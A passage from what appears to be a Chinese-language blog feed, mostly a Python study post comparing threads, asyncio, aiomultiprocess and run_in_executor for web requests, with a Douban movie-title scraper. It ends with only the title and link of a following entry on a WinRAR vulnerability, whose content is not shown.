class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Cost time: <span class="number">10.076906442642212</span></span><br></pre></td></tr></table></figure></li><li><p>多线程(以10次请求为例)：由于无法进行异步及GIL的存在，效率很低，上下文的切换导致开销，甚至时间比单线程更长一点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">start = time.time()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Request</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://127.0.0.1:5000'</span></span><br><span class="line">    print(<span class="string">'Waiting for'</span>,url)</span><br><span class="line">    result = requests.get(url).text</span><br><span class="line">    print(<span class="string">'Get response from'</span>,url,<span class="string">'Result:'</span>,result)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    t = threading.Thread(target = Request())</span><br><span class="line">    t.start()</span><br><span class="line">    t.join()</span><br><span class="line">end = time.time()</span><br><span class="line">print(<span class="string">'Cost time:'</span>,end - start)</span><br><span class="line"><span class="comment"># 运行结果：</span></span><br><span class="line"></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Cost time: <span class="number">30.073291301727295</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="同时使用多进程和异步协程进行请求"><a href="#同时使用多进程和异步协程进行请求" class="headerlink" title="同时使用多进程和异步协程进行请求"></a>同时使用多进程和异步协程进行请求</h3><blockquote><p>异步协程和多进程对网络请求都有提升,将二者结合起来：Facebook 的 John Reese 介绍了 asyncio 和 multiprocessing 各自的特点，并开发了一个新的库，叫做 aiomultiprocess</p></blockquote><ol><li><p>安装aiomultiprocess  <code>pip3 install aiomultiprocess</code></p></li><li><p>改写请求网络的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> aiomultiprocess <span class="keyword">import</span> Pool</span><br><span class="line"></span><br><span class="line">start = time.time()</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(url)</span>:</span></span><br><span class="line">    session = aiohttp.ClientSession()</span><br><span class="line">    response = <span class="keyword">await</span> session.get(url)</span><br><span class="line">    result = <span class="keyword">await</span> response.text()</span><br><span class="line">    session.close()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">request</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://127.0.0.1:5000'</span></span><br><span class="line">    urls = [url <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">100</span>)]</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> Pool() <span class="keyword">as</span> pool:</span><br><span class="line">        result = <span class="keyword">await</span> pool.map(get, urls)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">coroutine = request()</span><br><span class="line">task = asyncio.ensure_future(coroutine)</span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(task)</span><br><span class="line"></span><br><span class="line">end = time.time()</span><br><span class="line">print(<span class="string">'Cost time:'</span>, end - start)</span><br></pre></td></tr></table></figure></li></ol><h3 id="骚思路学习"><a href="#骚思路学习" class="headerlink" title="骚思路学习"></a>骚思路学习</h3><h4 id="requests实现异步爬虫一"><a href="#requests实现异步爬虫一" class="headerlink" title="requests实现异步爬虫一"></a>requests实现异步爬虫一</h4><blockquote><p>如同前面介绍如何在asyncio中使用requests模块一样，如果想在asyncio中使用其他阻塞函数，该怎么实现呢？虽然目前有异步函数支持asyncio，但实际问题是大部分IO模块还不支持asyncio。 阻塞函数(例如io读写，requests网络请求)阻塞了客户代码与asycio事件循环的唯一线程，因此在执行调用时，整个应用程序都会冻结。</p></blockquote><ul><li><p>解决方案：这个问题的解决方法是使用事件循环对象的run_in_executor方法。asyncio的事件循环在背后维护着一个ThreadPoolExecutor对象，我们可以调用run_in_executor方法，把可调用对象发给它执行，即可以通过run_in_executor方法来新建一个线程来执行耗时函数。</p></li><li><p>run_in_executor方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AbstractEventLoop.run_in_executor(executor, func, *args)</span><br><span class="line">executor 参数应该是一个 Executor 实例。如果为 None，则使用默认 executor。</span><br><span class="line">func 就是要执行的函数</span><br><span class="line">args 就是传递给 func 的参数</span><br></pre></td></tr></table></figure></li><li><p>实例（使用time.sleep()）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(url)</span>:</span></span><br><span class="line">    print(<span class="string">"start "</span>,url)</span><br><span class="line">    loop = asyncio.get_event_loop()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">await</span> loop.run_in_executor(<span class="keyword">None</span>,time.sleep,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line">    print(<span class="string">"stop "</span>,url)</span><br><span class="line">url_list = [<span class="string">"https://thief.one"</span>,<span class="string">"https://home.nmask.cn"</span>,<span class="string">"https://movie.nmask.cn"</span>,<span class="string">"https://tool.nmask.cn"</span>]</span><br><span class="line">tasks = [asyncio.ensure_future(run(url)) <span class="keyword">for</span> url <span class="keyword">in</span> url_list]</span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行结果</span></span><br><span class="line">start  https://thief.one</span><br><span class="line">start  https://home.nmask.cn</span><br><span class="line">start  https://movie.nmask.cn</span><br><span class="line">start  https://tool.nmask.cn</span><br><span class="line">stop  https://home.nmask.cn</span><br><span class="line">stop  https://thief.one</span><br><span class="line">stop  https://tool.nmask.cn</span><br><span class="line">stop  https://movie.nmask.cn</span><br></pre></td></tr></table></figure></li><li><p>有了run_in_executor方法，我们就可以使用之前熟悉的模块创建协程并发了，而不需要使用特定的模块进行IO异步开发。</p></li></ul><h4 id="requests实现异步爬虫二"><a href="#requests实现异步爬虫二" class="headerlink" title="requests实现异步爬虫二"></a>requests实现异步爬虫二</h4><blockquote><p>上面说了通过run_in_executor方法来添加线程的方式实现异步。在与之前学过的多线程、多进程相比，asyncio模块有一个非常大的不同：传入的函数不是随心所欲，所以这里以实现time.sleep的时的异步；以及修改函数为一个我们自己定义的函数。</p></blockquote><ol><li><p>实现time.sleep时的异步（run_in_executor开启了新的线程，再协调各个线程）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">start = time.time()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myfun</span><span class="params">(i)</span>:</span></span><br><span class="line">    print(<span class="string">'start &#123;&#125;th'</span>.format(i))</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'finish &#123;&#125;th'</span>.format(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    loop = asyncio.get_event_loop()</span><br><span class="line">    futures = (</span><br><span class="line">        loop.run_in_executor(</span><br><span class="line">            <span class="keyword">None</span>,</span><br><span class="line">            myfun,</span><br><span class="line">            i)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> <span class="keyword">await</span> asyncio.gather(*futures):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(main())</span><br><span class="line"></span><br><span class="line">end = time.time()</span><br><span class="line">print(end - start)</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行结果：</span></span><br><span class="line">start <span class="number">0</span>th</span><br><span class="line">start <span class="number">1</span>th</span><br><span class="line">start <span class="number">2</span>th</span><br><span class="line">start <span class="number">3</span>th</span><br><span class="line">start <span class="number">4</span>th</span><br><span class="line">start <span class="number">5</span>th</span><br><span class="line">start <span class="number">6</span>th</span><br><span class="line">start <span class="number">7</span>th</span><br><span class="line">start <span class="number">8</span>th</span><br><span class="line">start <span class="number">9</span>th</span><br><span class="line">finish <span class="number">0</span>th</span><br><span class="line">finish <span class="number">3</span>th</span><br><span class="line">finish <span class="number">2</span>th</span><br><span class="line">finish <span class="number">1</span>th</span><br><span class="line">finish <span class="number">5</span>th</span><br><span class="line">finish <span class="number">4</span>th</span><br><span class="line">finish <span class="number">6</span>th</span><br><span class="line">finish <span class="number">7</span>th</span><br><span class="line">finish <span class="number">8</span>th</span><br><span class="line">finish <span class="number">9</span>th</span><br><span class="line"><span class="number">1.008263111114502</span></span><br></pre></td></tr></table></figure></li><li><p>修改开启的线程数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> concurrent.futures <span class="keyword">as</span> cf <span class="comment"># 多加一个模块</span></span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">start = time.time()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myfun</span><span class="params">(i)</span>:</span></span><br><span class="line">    print(<span class="string">'start &#123;&#125;th'</span>.format(i))</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'finish &#123;&#125;th'</span>.format(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> cf.ThreadPoolExecutor(max_workers = <span class="number">10</span>) <span class="keyword">as</span> executor: <span class="comment"># 设置10个线程</span></span><br><span class="line">        loop = asyncio.get_event_loop()</span><br><span class="line">        futures = (</span><br><span class="line">            loop.run_in_executor(</span><br><span class="line">                executor, <span class="comment"># 按照10个线程来执行</span></span><br><span class="line">                myfun,</span><br><span class="line">                i)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">for</span> result <span class="keyword">in</span> <span class="keyword">await</span> asyncio.gather(*futures):</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(main())</span><br><span class="line"></span><br><span class="line">end = time.time()</span><br><span class="line">print(end - start)</span><br></pre></td></tr></table></figure></li><li><p>修改函数为爬去豆瓣的电影标题(实际上没有出发异步)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">start = time.time()</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">get_title</span><span class="params">(a)</span>:</span></span><br><span class="line"></span><br><span class="line">    url = <span class="string">'https://movie.douban.com/top250?start=&#123;&#125;&amp;filter='</span>.format(a*<span class="number">25</span>)</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    soup = BeautifulSoup(r.content, <span class="string">'html.parser'</span>)</span><br><span class="line">    lis = soup.find(<span class="string">'ol'</span>, class_=<span class="string">'grid_view'</span>).find_all(<span class="string">'li'</span>)</span><br><span class="line">    <span class="keyword">for</span> li <span class="keyword">in</span> lis:</span><br><span class="line">        title = li.find(<span class="string">'span'</span>, class_=<span class="string">"title"</span>).text</span><br><span class="line">        print(title)</span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">fun_list = (get_title(i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>))</span><br><span class="line">loop.run_until_complete(asyncio.gather(*fun_list))</span><br><span class="line"></span><br><span class="line">end = time.time()</span><br><span class="line">print(end - start)</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行结果：（部分结果）</span></span><br><span class="line">变脸</span><br><span class="line">卡萨布兰卡</span><br><span class="line">海盗电台</span><br><span class="line"><span class="number">8.284837245941162</span></span><br></pre></td></tr></table></figure></li><li><p>修改用run_in_executor开启了新的线程触发异步</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> concurrent.futures <span class="keyword">as</span> cf</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">start = time.time()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_title</span><span class="params">(i)</span>:</span></span><br><span class="line">    url = <span class="string">'https://movie.douban.com/top250?start=&#123;&#125;&amp;filter='</span>.format(i*<span class="number">25</span>)</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    soup = BeautifulSoup(r.content, <span class="string">'html.parser'</span>)</span><br><span class="line">    lis = soup.find(<span class="string">'ol'</span>, class_=<span class="string">'grid_view'</span>).find_all(<span class="string">'li'</span>)</span><br><span class="line">    <span class="keyword">for</span> li <span class="keyword">in</span> lis:</span><br><span class="line">        title = li.find(<span class="string">'span'</span>, class_=<span class="string">"title"</span>).text</span><br><span class="line">        print(title)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> cf.ThreadPoolExecutor(max_workers = <span class="number">10</span>) <span class="keyword">as</span> executor:</span><br><span class="line">        loop = asyncio.get_event_loop()</span><br><span class="line">        futures = (</span><br><span class="line">            loop.run_in_executor(</span><br><span class="line">                executor,</span><br><span class="line">                get_title,</span><br><span class="line">                i)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">for</span> result <span class="keyword">in</span> <span class="keyword">await</span> asyncio.gather(*futures):</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(main())</span><br><span class="line"></span><br><span class="line">end = time.time()</span><br><span class="line"></span><br><span class="line">print(end - start)</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行结果：（部分）</span></span><br><span class="line">当幸福来敲门</span><br><span class="line">乱世佳人</span><br><span class="line">怦然心动</span><br><span class="line"><span class="number">0.8107953071594238</span></span><br></pre></td></tr></table></figure></li><li><p>通过对比可以看出python中协程可以极大的提升I/O操作的效率，在上述爬去豆瓣的250个电影标题中效率提升了一个数量级。</p></li></ol><h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><blockquote><p>第三方库uvloop可以对aiohttp加速，uvloop库基于libuv，也就是nodejs用的那个库。使用它也非常方便；有一个问题就是uvloop仅支持在Linux下的使用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="keyword">import</span> asyncio</span><br><span class="line">&gt;<span class="keyword">import</span> uvloop</span><br><span class="line">&gt;asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>​    </p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>本次通过学习python协程，对于python的高并发、异步编程做了较为全面的了解，同时对python的多线程、多进程、线程池、进程池等问题进行了回顾总结，提升编写工具的性能，目前来说满足了需求，通过本次学习，弥补了一些短板的地方。学习任重而道远！</p><h4 id="本次学习参考的资料链接如下："><a href="#本次学习参考的资料链接如下：" class="headerlink" title="本次学习参考的资料链接如下："></a>本次学习参考的资料链接如下：</h4><p>[]:<a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/00143208573480558080fa77514407cb23834c78c6c7309000" target="_blank" rel="noopener">https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/00143208573480558080fa77514407cb23834c78c6c7309000</a></p><p>[]:<a href="https://cuiqingcai.com/6160.html" target="_blank" rel="noopener">https://cuiqingcai.com/6160.html</a></p><p>[]:<a href="http://www.langzi.fun/Python%E5%8D%8F%E7%A8%8B.html" target="_blank" rel="noopener">http://www.langzi.fun/Python%E5%8D%8F%E7%A8%8B.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;python学习总结&quot;&gt;&lt;a href=&quot;#python学习总结&quot; class=&quot;headerlink&quot; title=&quot;python学习总结&quot;&gt;&lt;/a&gt;python学习总结&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;在编写程序处理一些任务时为了提高效率，我们的程序会
      
    
    </summary>
    
      <category term="python" scheme="https://www.lsowl.top/categories/python/"/>
    
    
      <category term="编程" scheme="https://www.lsowl.top/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="python" scheme="https://www.lsowl.top/tags/python/"/>
    
      <category term="异步" scheme="https://www.lsowl.top/tags/%E5%BC%82%E6%AD%A5/"/>
    
  </entry>
  
  <entry>
    <title>winRAR远程代码执行漏洞复现(CVE-2018-20250)</title>
    <link href="https://www.lsowl.top/2018/11/08/winRAR%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2018-20250/"/>
    <id>https://www.lsowl.top/2018/11/08/winRAR远程代码执行漏洞复现-CVE-2018-20250/</id>
    <published>2018-11-08T14:23:15.000Z</published>
    <updated>2019-11-08T14:30:17.737Z</updated>
    
